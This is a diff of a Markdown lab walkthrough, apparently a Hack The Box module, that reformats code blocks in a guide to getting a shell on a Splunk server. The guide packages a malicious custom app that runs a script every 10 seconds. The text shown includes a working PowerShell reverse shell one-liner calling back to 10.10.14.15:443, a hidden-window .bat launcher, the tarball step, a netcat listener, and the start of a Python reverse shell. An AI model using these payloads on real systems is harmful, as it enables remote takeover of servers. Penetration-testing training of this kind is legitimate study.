@@ -12,8 +12,7 @@ We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk packag
 
 To achieve this, we first need to create a custom Splunk application using the following directory structure.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ tree splunk_shell/
 
 splunk_shell/
@@ -25,8 +24,7 @@ splunk_shell/
 
 The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.
 
-```
-        powershell
+```powershell
 #A simple and small reverse shell. Options and help removed to save space. 
 #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
 $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
@@ -34,8 +32,7 @@ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $
 
 The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat inputs.conf 
 
 [script://./bin/rev.py]
@@ -51,8 +48,7 @@ interval = 10
 
 We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
 
-```
-        shellsession
+```shellsession
 @ECHO OFF
 PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
 Exit
@@ -60,8 +56,7 @@ Exit
 
 Once the files are created, we can create a tarball or `.spl` file.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/
 
 splunk_shell/
@@ -81,8 +76,7 @@ https://10.129.201.50:8000/en-US/manager/search/apps/local
 
 Before uploading the malicious custom app, let's start a listener using Netcat or [socat](https://linux.die.net/man/1/socat).
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lnvp 443
 
 listening on [any] 443 ...
@@ -96,8 +90,7 @@ https://10.129.201.50:8000/en-US/manager/appinstall/\_upload?breadcrumbs=Setting
 
 As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lnvp 443
 
 listening on [any] 443 ...
@@ -118,8 +111,7 @@ In this case, we got a shell back as `NT AUTHORTY\SYSTEM`. If this were a real-w
 
 If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
 
-```
-        python
+```python
 import sys,socket,os,pty
 
 ip="10.10.14.15"
